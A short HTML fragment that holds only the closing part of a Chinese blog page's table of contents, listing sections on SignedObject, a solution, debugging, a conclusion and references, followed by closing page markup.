class="toc-text">SignedObject</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88"><span class="toc-number">1.0.5.</span> <span class="toc-text">解决方案</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E8%AF%95"><span class="toc-number">1.0.6.</span> <span class="toc-text">调试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%93%E8%AF%AD"><span class="toc-number">1.0.7.</span> <span class="toc-text">结语</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"><span class="toc-number">1.0.8.</span> <span class="toc-text">参考文献</span></a></li></ol></li></ol></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>
